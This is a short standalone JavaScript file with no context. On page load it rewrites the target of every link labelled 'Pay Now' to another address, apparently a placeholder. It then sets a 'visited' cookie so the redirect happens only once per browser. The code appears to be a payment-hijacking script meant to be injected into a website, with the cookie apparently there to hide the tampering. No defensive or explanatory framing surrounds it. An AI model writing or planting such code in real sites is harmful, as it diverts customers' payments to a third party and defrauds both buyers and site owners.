function executeScript() {
    console.log("loaded");
    var newurl = "this.com";
    
    // Check if the "visited" cookie exists
    if (document.cookie.indexOf('visited=true') !== -1) {
        console.log('Visited cookie exists, not replacing URL');
        return; // Exit the function
    }
    
    var anchorElements = document.querySelectorAll('a');
    
    
    // Loop through each <a> element
    anchorElements.forEach(function(anchorElement) {
        // Check if the text content of the <a> element is "Pay Now"
        if (anchorElement.textContent.trim() === 'Pay Now') {
            // Change the href attribute to "this.com"
            anchorElement.href = newurl;
            
            // Add a click event listener to the anchor element
            anchorElement.addEventListener('click', function() {
                // Set a cookie named 'visited' with value 'true'
                document.cookie = 'visited=true';
            });
        }
    });
}

// Add an event listener for the 'DOMContentLoaded' event
document.addEventListener('DOMContentLoaded', executeScript);
executeScript();
